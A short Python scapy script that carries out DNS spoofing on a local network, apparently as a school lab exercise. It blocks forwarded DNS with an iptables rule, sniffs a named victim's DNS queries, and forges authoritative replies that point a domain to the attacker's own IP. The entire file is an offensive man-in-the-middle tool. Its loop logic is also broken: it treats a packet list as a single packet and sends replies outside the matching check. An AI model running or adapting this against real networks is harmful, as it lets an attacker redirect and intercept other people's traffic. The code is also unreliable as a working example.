from scapy.all import sniff, srp, IP, DNS, DNSQR, Ether, UDP, DNSRR, sendp
from subprocess import Popen, PIPE

domain = 'reverseproxy.ynov.com.'
victimIP = "10.5.1.2"
routerIP = "10.5.1.254"
ownIP = "10.5.1.3"
gotoIP = "10.5.1.3"

firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
Popen([firewall], shell=True, stdout=PIPE)


while True:
    packet  = sniff(filter="udp and port 53")
    if packet[IP].src == victimIP and packet.haslayer(DNS) and DNSQR in packet:
        spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=gotoIP)))
    sendp(spoof, count=1)

    
